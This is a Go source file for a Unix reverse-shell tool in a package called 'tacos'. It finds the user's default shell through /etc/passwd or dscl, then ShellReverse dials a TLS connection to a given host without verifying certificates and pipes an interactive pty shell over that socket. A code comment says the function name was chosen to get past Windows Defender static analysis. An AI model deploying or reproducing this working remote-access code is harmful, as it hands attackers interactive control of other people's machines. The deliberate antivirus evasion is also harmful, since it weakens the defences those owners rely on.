//go:build !windows
// +build !windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"

	"github.com/ariary/go-utils/pkg/logger"
	"github.com/creack/pty"
	"golang.org/x/term"
)

//DetectDefaultShell: return the default shell
func DetectDefaultShell() (shell string) {
	//Determine default shell

	//macOS
	var command string
	if runtime.GOOS == "darwin" { //mac os
		command = "dscl . -read ~/ UserShell"
	} else {
		//linux
		command = "grep ^$(id -un): /etc/passwd | cut -d : -f 7-"
	}

	defaultShell, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		log.Fatal(err)
		fmt.Sprintf("Failed to retrieve default shell, use sh: %s", command)
		return "/bin/sh"
	}

	shell = string(defaultShell)
	shell = strings.ReplaceAll(shell, "\n", "")

	return shell
}

//ShellReverse: spawn a reverse shell with pty targeting host (ip:port).
// (Name is ShellReverse cause ReverseShell does not pass windows defender static analysis)
func ShellReverse(host string, shell string) {
	logger.AddFilenameAndLinePrefix(log.Default())
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", host, conf)
	if err != nil {
		panic(err)
	}

	var args []string
	if strings.Contains(shell, "bash") {
		args = append(args, "-li")
	} else if strings.Contains(shell, "zsh") || strings.Contains(shell, "csh") || strings.Contains(shell, "tsh") || strings.Contains(shell, "/sh") {
		args = append(args, "-i")
	}

	cmd := exec.Command(shell, args...)

	// Start the command with a pty.
	ptmx, err := pty.Start(cmd)
	if err != nil {
		log.Printf("error starting pty: %s", err)
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH                        // Initial resize.
	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Printf("error setting stdin in raw mode: %s", err)
	}
	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	// Copy socket stdin to the pty and the pty to socket stdout.
	go func() { _, _ = io.Copy(ptmx, conn) }()
	_, _ = io.Copy(conn, ptmx)

	conn.Close()
}
